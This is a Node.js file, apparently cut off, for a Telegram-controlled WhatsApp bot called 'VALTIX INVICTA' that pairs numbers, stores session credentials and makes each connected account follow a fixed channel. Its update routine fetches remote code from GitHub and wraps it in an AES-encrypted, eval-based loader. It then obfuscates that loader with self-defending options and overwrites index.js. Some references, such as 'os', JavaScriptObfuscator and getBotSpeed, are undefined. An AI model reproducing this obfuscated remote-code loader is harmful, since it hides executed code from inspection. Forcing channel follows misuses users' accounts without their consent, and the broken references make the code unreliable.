/// ------ ( set const ) ------ \\
const {
    default: makeWASocket,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys")
const TARGET_CHANNEL = "0029VbBr5hqLY6dCgJEHRK24@newsletter";
const CHANNEL_URL    = "https://whatsapp.com/channel/0029VbBr5hqLY6dCgJEHRK24";
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const lastMsg = new Map();
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const moment = require("moment");
const config = require("./config.js");
const { BOT_TOKEN, OWNER_ID } = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const ONLY_FILE = path.join(__dirname, "dbinvicta", "gconly.json");
const cd = path.join(__dirname, "dbinvicta", "cd.json");

/// ------ ( Update Config ) ------ \\
const UPDATE_CONFIG = {
  GITHUB_RAW_URL: "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/main/index.js",
  GITHUB_VERSION_URL: "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/main/version.json",
  CURRENT_HASH: crypto.createHash('sha256').update(fs.readFileSync(__filename)).digest('hex')
};

// Simpan hash di baris 2
const lines = fs.readFileSync(__filename, 'utf-8').split('\n');
if (!lines[1].includes('const CODE_HASH')) {
  lines.splice(1, 0, `const CODE_HASH='${UPDATE_CONFIG.CURRENT_HASH}';`);
  fs.writeFileSync(__filename, lines.join('\n'));
}

/// --- ( Random Video ) --- \\\
const randomVideos = [
  "https://e.top4top.io/m_3646o4kcu1.mp4",
];

const getRandomVid = () => {
  return randomVideos[Math.floor(Math.random() * randomVideos.length)];
};

/// --- ( Ghitub Raw ) --- \\\  
const bot = new TelegramBot(BOT_TOKEN, { polling: true }); 
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/refs/heads/main/tokens.json";
// ----------------- ( Pengecekan Token ) ------------------- \\
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    // Pastikan struktur datanya sesuai { "tokens": ["xxxx", "yyyy"] }
    if (!response.data || !Array.isArray(response.data.tokens)) {
      console.error(chalk.red("❌ Struktur file tokens.json tidak valid."));
      return [];
    }

    console.log(chalk.green(`✅ Daftar token berhasil diambil dari database (${response.data.tokens.length} terdaftar)`));
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari database:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue(`🔍 Memeriksa apakah token valid\n`));

  // Cek token environment
  if (!BOT_TOKEN) {
    console.error(chalk.red("❌ BOT_TOKEN tidak ditemukan! Pastikan sudah diset di .env"));
    process.exit(1);
  }

  // Ambil daftar token dari GitHub
  const validTokens = await fetchValidTokens(BOT_TOKEN);

  // Pastikan hasilnya berupa array
  if (!Array.isArray(validTokens)) {
    console.error(chalk.red("❌ Gagal memuat daftar token dari database (data bukan array)"));
    process.exit(1);
  }

  // Validasi token
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(`
═══════════════════════════════════════════
TOKEN ANDA TIDAK TERDAFTAR DI DATABASE !!!
═══════════════════════════════════════════
⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
    process.exit(1);
  }

  console.log(chalk.green(`✅ あなたのトークンは有効です`));
  startBot();
  initializeWhatsAppConnections();
}

function rainbow(str) {
  const colors = [
    [255, 0, 0], [255, 95, 0], [255, 185, 0], [255, 255, 0],
    [0, 255, 0], [0, 255, 255], [0, 0, 255], [128, 0, 128]
  ];
  const lines = str.split('\n');
  return lines.map((line, i) => {
    const [r, g, b] = colors[i % colors.length];
    return chalk.rgb(r, g, b)(line);
  }).join('\n');
}

function startBot() {
  console.log(rainbow(`
⠀⠀⠀⠀⢀⣠⣴⠶⠚⠛⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⡆⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣶⣶⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣴⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣥⣤⠶⣶⣼⣿⣿⠟⠁⠀⠉⠛⠿⣿⣿⣿⡟⠛⠻⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡞⠛⠒⣿⣿⣿⠏⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡄⠀⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⡎⠀⣴⣶⣿⣿⡟⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣷⠀⠀⠀⠈⠻⣷⣄⡀⢀⣀⣠⣤⣤⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢮⣉⣹⣿⣿⣿⣿⡇⠀⢠⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⠛⠟⠛⠛⠋⠉⠉⠉⠉⠉⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⣿⣿⣿⡟⢸⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⠿⠟⠃⢸⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⡴⠀⠀⠀⠀⠀⠀⢀⣠⣤⣄⡀⠀⠀⢻⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣴⡇⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣶⣄⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⢁⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡿⠁⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣸⠃⠀⣿⣿⣿⣿⣿⣿⣿⠃⠀⠈⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⣾⣿⣿⣷⡀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡅⠙⠳⢦⡀⠀⠀
⠀⠀⠀⢰⡏⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣶⣄⠈⠛⠿⢿⣿⡿⠿⠟⠋⣁⣴⣾⣿⡟⠁⠸⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠈⣷⠀⠀
⠀⠀⠀⢸⡇⠀⠀⣿⣿⣿⣿⣿⣿⠃⠀⢿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⣿⣿⡏⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⢸⡆⠀
⠀⠀⠀⣼⠇⠀⢀⣿⣿⣿⣿⣿⠃⠀⠀⠸⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣷⣦⣄⣷⠀
⠀⠀⠀⢻⣷⣶⣼⣿⣿⣿⣿⣧⡀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣦⠀⢀⣴⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⠆
⠀⠀⠀⠀⠻⠿⠿⢿⣿⣿⣿⣿⡿⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⠇⠀⢸⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⢿⣿⣿⣿⣿⡿⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ developer: @Thaureyo
☇ Name Script : VALTIX INVICTA
☇ Version : ONE FILE AUTO UPDATE
☇ Status : Online

`));
console.log(chalk.white(``));
}
validateToken();

// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function autoJoinChannel(sock) {
  try {
    // Cek apakah newsletterFollow tersedia
    if (typeof sock.newsletterFollow !== 'function') {
      console.log(chalk.yellow("⚠️ newsletterFollow tidak tersedia di Baileys fork ini."));
      return;
    }
    await sock.newsletterFollow(TARGET_CHANNEL);
    console.log(chalk.green(`✅ Auto-join channel sukses: ${CHANNEL_URL}`));
  } catch (e) {
    console.log(chalk.red(`❌ Gagal auto-join channel: ${e.message}`));
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} terhubung!`));
              sessions.set(botNumber, sock);

              /* ---- AUTO-JOIN CHANNEL ---- */
              await autoJoinChannel(sock);

              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
  
}
/* ===== PTERO-SAFE AUTO-UPDATE (Encrypted + Obfuscated) ===== */
async function performUpdate(chatId) {
  const updateMsg = await bot.sendMessage(chatId, "*[Updater]* Downloading latest script…", { parse_mode: "Markdown" });

  try {
    /* 1. Download raw */
    const [{ data: remoteScript }, { data: remoteVersion }] = await Promise.all([
      axios.get(UPDATE_CONFIG.GITHUB_RAW_URL, { timeout: 30_000 }),
      axios.get(UPDATE_CONFIG.GITHUB_VERSION_URL, { timeout: 10_000 })
    ]);

    /* 2. Encrypt payload (AES-256-CBC) – key = env */
    const _KEY = process.platform + process.arch + crypto.createHash("sha1").update(os.hostname()).digest("hex");
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv("aes-256-cbc", crypto.createHash("sha256").update(_KEY).digest(), iv);
    let encrypted = cipher.update(remoteScript, "utf8", "base64");
    encrypted += cipher.final("base64");
    const payload = iv.toString("base64") + ":" + encrypted;

    /* 3. Buat loader kecil (runtime decrypt) */
    const loader = `
(()=>{
  const c=require('crypto'),o=require('os');
  const k=process.platform+process.arch+c.createHash('sha1').update(o.hostname()).digest('hex');
  const [iv,b]=process.argv[1].split(':');
  const d=c.createDecipheriv('aes-256-cbc',c.createHash('sha256').update(k).digest(),Buffer.from(iv,'base64'));
  let r=d.update(b,'base64','utf8');r+=d.final('utf8');eval(r);
})("${payload}");
`;

    /* 4. Obfuscate loader pakai JavaScript-Obfuscator */
    const obfuscated = JavaScriptObfuscator.obfuscate(loader, {
      compact: true,
      controlFlowFlattening: 1,
      controlFlowFlatteningThreshold: 1,
      deadCodeInjection: true,
      deadCodeInjectionThreshold: 0.4,
      debugProtection: false,        // Ptero kadang kena false-positive kalau true
      debugProtectionInterval: 0,
      disableConsoleOutput: false,   // biar log tetap keluar
      selfDefending: true,
      stringArray: true,
      stringArrayEncoding: ["rc4", "base64"],
      splitStrings: true,
      splitStringsChunkLength: 3,
      transformObjectKeys: true,
      unicodeEscapeSequence: false,
      seed: Math.floor(Math.random() * 1e9)
    }).getObfuscatedCode();

    /* 5. Backup & tulis */
    const mainFile = path.join(process.cwd(), "index.js");
    const backupFile = path.join(process.cwd(), "index.js.bak");
    if (fs.existsSync(mainFile)) fs.copyFileSync(mainFile, backupFile);
    fs.writeFileSync(mainFile, obfuscated, "utf-8");
    fs.writeFileSync(path.join(process.cwd(), "version.json"), JSON.stringify(remoteVersion, null, 2));

    await bot.editMessageText(
      "✅ Update selesai! File sudah di-encrypt + obfuscate. Silakan restart container di panel Ptero (klik Restart).",
      { chat_id: chatId, message_id: updateMsg.message_id, parse_mode: "Markdown" }
    );

    /* 6. Opsional: auto-restart via Ptero signal (jika kamu pakai egg custom) */
    // require('fs').writeFileSync('/tmp/ptero_restart_flag', '1'); // egg bisa baca ini

  } catch (err) {
    await bot.editMessageText(
      `❌ Gagal update:\n\`${err.message}\``,
      { chat_id: chatId, message_id: updateMsg.message_id, parse_mode: "Markdown" }
    );
  }
}

//// --- ( Intalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
┃⟜❏ Menyiapkan Kode Pairing
┃  ╰➤ Number: ${botNumber}
╰━───────╯
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰━───━╮
┃⟜❏ Memproses Connecting
┃  ╰➤ Number: ${botNumber}
┃  ╰➤ Status: Connecting...
╰━───────╯
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
┃⟜❏ Connection Gagal.
┃  ╰➤ Number: ${botNumber}
┃  ╰➤ Status: Gagal ❌
╰━───────╯
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
┃⟜❏ Connection Sukses
┃  ╰➤ Number: ${botNumber}
┃  ╰➤ Status: Sukses Connect.
╰━───────╯
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber, "VALTIX78");
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
┃⟜❏ Code Pairing Kamu
┃  ╰➤ Number: ${botNumber}
┃  ╰➤ Code: ${formattedCode}
╰━───────╯
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
┃⟜❏ Menyiapkan Kode Pairing
┃  ╰➤ Number: ${botNumber}
┃  ╰➤ Status: ${error.message} Error⚠️
╰━───────╯
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }


// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./dbinvicta/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./dbinvicta/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./dbinvicta/premium.json');
            ensureFileExists('./dbinvicta/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./dbinvicta/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./dbinvicta/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./dbinvicta/premium.json', (data) => (premiumUsers = data));
    watchFile('./dbinvicta/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

/// --- ( Fungsi buat file otomatis ) --- \\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}

function getCurrentTimeWIB() {
  return new Date().toLocaleTimeString('id-ID', {
    timeZone: 'Asia/Jakarta',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
}

function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}


/// --- ( Menu Utama ) --- \\\
const bugRequests = {};

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username
    ? `@${msg.from.username}`
    : msg.from.first_name || "User";

const startMsg = await bot.sendMessage(chatId, "▰▱▱▱▱▱▱  0%");

const bar = [
  "▰▱▱▱▱▱▱",
  "▰▰▱▱▱▱▱",
  "▰▰▰▱▱▱▱",
  "▰▰▰▰▱▱▱",
  "▰▰▰▰▰▱▱",
  "▰▰▰▰▰▰▱",
  "▰▰▰▰▰▰▰"
];

for (let i = 0; i < bar.length; i++) {
  await new Promise(r => setTimeout(r, 180));
  await bot.editMessageText(`${bar[i]}  ${(i + 1) * 15}%`, {
    chat_id: chatId,
    message_id: startMsg.message_id
  });
}

const troll = await bot.sendMessage(chatId, "🖕");
await new Promise(r => setTimeout(r, 1500));
await bot.deleteMessage(chatId, troll.message_id);
/* ---------------------------------------------- */

  // Setelah animasi selesai
  setTimeout(async () => {
    try {
      await bot.deleteMessage(chatId, startMsg.message_id);
    } catch {}

const videoUrl = "https://e.top4top.io/m_3646o4kcu1.mp4";
    const date = new Date().toLocaleString("id-ID", {
      dateStyle: "full",
      timeStyle: "short",
    });

    await bot.sendVideo(chatId, videoUrl, {
caption: `<blockquote>
